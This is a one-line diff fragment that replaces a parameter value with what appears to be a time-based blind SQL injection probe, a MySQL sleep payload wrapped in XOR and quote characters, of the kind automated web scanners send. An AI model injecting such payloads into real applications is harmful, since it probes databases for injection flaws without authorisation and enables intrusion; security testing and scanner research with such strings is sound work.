@@ -1,1 +1,1 @@
-555&n946836=v923017
+5550'XOR(555*if(now()=sysdate(),sleep(15),0))XOR'Z
